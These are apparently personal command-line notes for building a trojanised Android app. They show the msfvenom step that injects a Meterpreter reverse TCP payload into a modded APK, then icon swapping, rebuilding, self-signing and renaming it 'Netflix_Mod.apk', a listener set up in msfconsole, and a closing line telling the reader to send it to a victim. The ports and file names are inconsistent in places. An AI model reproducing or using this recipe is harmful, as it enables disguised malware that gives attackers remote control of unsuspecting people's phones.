# here 1st we have to download any mode apk

(kali® Manguman)-[~]
> ls
NotMirror.apk.  node_modules. nuclei-templates package.json
package-lock.json. wrike-recon   aws. go

(kali® Manguman)-[~] -$

(kali® Manguman)-[~]
-$ msfvenom -x NetMirror.apk -p android/meterpreter/reverse_tcp LHOST=172.28.117.109 LPORT=80 80 -o Temp_MOD.apk

# -x means inject the msfvenom apk in mod apk
# so here we have to change the apk icon so download the icon at highest resolution of png

# now we have to decompile the apk
(kali® Manguman)-[~]
$ apktool d Temp_MOD.apk

(kali® Manguman)-[~]
> cd Temp_MOD/

(kali® Manguman)-[~/Temp_MOD]
> ls
AndroidManifest.xml apktool.yml assets lib original res smali unknown

# we have have to boot in windows with the same folder for changing some files
# in most of cases the app icons is in the files name 
- drawable-Idrtl-hdpi
- mipmap-hdpi

# now 1st we have to check the resolution of the default icon and resize the our icon according to that
# now just rename our icon with the default icon name 
# Change the icon in these folder also which for different mobile phone 
- mipmap-xhdpi
- mipmap-xxhdpi
- mipmap-xoxhdp

# now just boot in kali again 
# now recompile the mode apk 
(kali® Manguman)-[~]
$ apktool b Temp_MOD -o Temp_Mod_2.apk

# now we have to esign the apk 
-(kali® Manguman)-[~]
$ keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysiz e 2048 -validity 10000
Enter keystore password
# remember the password 
what is your first and last name? 
Unknown : any name
# after that just press enters 


Is CN=Pappu, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown [no]: yes
Generating 2,048 bit RSA key pair and self-signed certificate (SHA384wi 10,000 days
of
for: CN=Pappu, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, [Storing my-release-key.keystore]


kali® Manguman)-[~]
> zipalign -v 4 Temp_Mod_2.apk aligned_payload.apk

# now just sign the apk 
(kali® Manguman)-[~]
> apksigner sign --ks my-release-key.keystore --ks-key-alias alias_name aligned_payload.apk
Keystore password for signer #1: 
# it ask the password we have setup earlier 
# now just rename the apk
(kali® Manguman)-[~]
> mv aligned_payload.apk Netflix_Mod.apk

# now just host the listner
$ msfconsole -q
msf > set payload android/meterpreter/reverse_tcp
payload => android/meterpreter/reverse_tcp

msf > use exploit/multi/handler
[*] Using configured payload android/meterpreter/reverse_tcp 
msf exploit(multi/handler) > show options
msf exploit(multi/handler) > set LPORT 8080
LPORT => 8080 
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.28.117.109:8080



# now send the apk to victim and enjoy the hack
